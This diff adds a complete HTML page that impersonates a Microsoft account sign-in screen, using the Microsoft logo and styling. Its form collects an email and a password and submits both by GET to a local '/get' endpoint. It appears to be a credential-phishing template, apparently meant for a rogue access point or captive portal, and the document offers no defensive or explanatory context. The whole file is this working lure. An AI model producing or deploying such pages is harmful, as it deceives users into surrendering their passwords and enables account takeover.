@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            max-width: 400px;
+            padding: 25px;
+            margin: auto;
+        }
+        .form {
+            max-width: 300px;
+            padding: 20px;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+            margin: 0 auto;
+        }
+        h1 {
+            text-align: center;
+            color: #0067b8;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 10px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+        }
+        button[type="submit"] {
+            width: 100%;
+            background-color: #0067b8;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button[type="submit"]:hover {
+            background-color: #005299;
+        }
+        svg {
+            display: block;
+            margin: 0 auto;
+            width: 150px;
+            height: 150px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg viewBox="0 0 337.6 72" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+  <path fill="#737373" d="M140.4 14.4v43.2h-7.5V23.7h-.1l-13.4 33.9h-5l-13.7-33.9h-.1v33.9h-6.9V14.4h10.8l12.4 32h.2l13.1-32h10.2zm6.2 3.3c0-1.2.4-2.2 1.3-3 .9-.8 1.9-1.2 3.1-1.2 1.3 0 2.4.4 3.2 1.2s1.3 1.8 1.3 3-.4 2.2-1.3 3c-.9.8-1.9 1.2-3.2 1.2s-2.3-.4-3.1-1.2a4.5 4.5 0 0 1-1.3-3zm8.1 8.9v31h-7.3v-31h7.3zm22.1 25.7c1.1 0 2.3-.2 3.6-.8 1.3-.5 2.5-1.2 3.6-2v6.8c-1.2.7-2.5 1.2-4 1.5-1.5.3-3.1.5-4.9.5A14.7 14.7 0 0 1 159.7 43c0-5 1.5-9.1 4.4-12.3 2.9-3.2 7-4.8 12.4-4.8a18.4 18.4 0 0 1 7.4 1.7v7a11.5 11.5 0 0 0-7-2.6c-2.9 0-5.2.9-7 2.8s-2.6 4.4-2.6 7.6c0 3.1.9 5.6 2.6 7.3 1.7 1.7 4 2.6 6.9 2.6zm27.9-26.2a8 8 0 0 1 2.8.4v7.4c-.4-.3-.9-.6-1.7-.8s-1.6-.4-2.7-.4c-1.8 0-3.3.8-4.5 2.3s-1.9 3.8-1.9 7v15.6h-7.3v-31h7.3v4.9h.1c.7-1.7 1.7-3 3-4 1.4-.9 3-1.4 4.9-1.4zm3.2 16.5c0-5.1 1.5-9.2 4.3-12.2a16 16 0 0 1 12-4.5c4.8 0 8.6 1.4 11.3 4.3s4.1 6.8 4.1 11.7c0 5-1.5 9-4.3 12-2.9 3-6.8 4.5-11.8 4.5-4.8 0-8.6-1.4-11.4-4.2a16 16 0 0 1-4.2-11.6zm7.6-.3c0 3.2.7 5.7 2.2 7.4s3.6 2.6 6.3 2.6c2.6 0 4.7-.8 6.1-2.6 1.4-1.7 2.1-4.2 2.1-7.6a12 12 0 0 0-2.1-7.6 7.5 7.5 0 0 0-6-2.6c-2.7 0-4.7.9-6.2 2.7-1.7 1.9-2.4 4.4-2.4 7.7zm35-7.5c0 1 .3 1.9 1 2.5.7.6 2.1 1.3 4.4 2.2 2.9 1.2 5 2.5 6.1 3.9a8.1 8.1 0 0 1 1.8 5.3c0 2.9-1.1 5.2-3.4 7a14 14 0 0 1-9.1 2.6 23.7 23.7 0 0 1-8.3-1.7v-7.2c1.3.9 2.8 1.7 4.3 2.2 1.5.5 2.9.8 4.2.8 1.6 0 2.9-.2 3.6-.7.8-.5 1.2-1.2 1.2-2.3 0-1-.4-1.8-1.2-2.6-.8-.7-2.4-1.5-4.6-2.4-2.7-1.1-4.6-2.4-5.7-3.8s-1.7-3.2-1.7-5.4c0-2.8 1.1-5.1 3.3-6.9 2.2-1.8 5.1-2.7 8.6-2.7 1.1 0 2.3.1 3.6.4l3.4.9V34c-1-.6-2.1-1.2-3.4-1.7-1.3-.5-2.6-.7-3.8-.7-1.4 0-2.5.3-3.2.8-.7.7-1.1 1.4-1.1 2.4zm16.4 7.8c0-5.1 1.5-9.2 4.3-12.2a16 16 0 0 1 12-4.5c4.8 0 8.6 1.4 11.3 4.3s4.1 6.8 4.1 11.7c0 5-1.5 9-4.3 12-2.9 3-6.8 4.5-11.8 4.5-4.8 0-8.6-1.4-11.4-4.2a16.5 16.5 0 0 1-4.2-11.6zm7.6-.3c0 3.2.7 5.7 2.2 7.4s3.6 2.6 6.3 2.6c2.6 0 4.7-.8 6.1-2.6 1.4-1.7 2.1-4.2 2.1-7.6a12 12 0 0 0-2.1-7.6 7.5 7.5 0 0 0-6-2.6c-2.7 0-4.7.9-6.2 2.7-1.7 1.9-2.4 4.4-2.4 7.7zm48.4-9.7H312v25h-7.4v-25h-5.2v-6h5.2v-4.3c0-3.2 1.1-5.9 3.2-8s4.8-3.1 8.1-3.1l2.4.1c.7 0 1.3.2 1.8.4V18l-1.3-.5c-.6-.2-1.3-.3-2.1-.3-1.5 0-2.7.5-3.5 1.4-.8.9-1.2 2.4-1.2 4.2v3.7h10.9v-7l7.3-2.2v9.2h7.4v6h-7.4V47c0 1.9.4 3.2 1 4 .7.8 1.8 1.2 3.3 1.2a5 5 0 0 0 1.5-.3c.6-.2 1.1-.4 1.5-.7v6a7 7 0 0 1-2.3.7c-1.1.2-2.1.3-3.2.3-3.1 0-5.4-.8-6.9-2.4-1.5-1.6-2.3-4.1-2.3-7.4l.1-15.8z"/>
+  <path fill="#F25022" d="M0 0h34.2v34.2H0z"/>
+  <path fill="#7FBA00" d="M37.8 0H72v34.2H37.8z"/>
+  <path fill="#00A4EF" d="M0 37.8h34.2V72H0z"/>
+  <path fill="#FFB900" d="M37.8 37.8H72V72H37.8z"/>
+</svg>
+        <form action="/get" method="get" id="email-form-step" class="form">
+            <h1>Sign In with<br>your Microsoft account</h1>
+            <input name="email" type="text" placeholder="Email" required>
+            <input name="password" type="password" placeholder="Password" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+</body>
+</html>
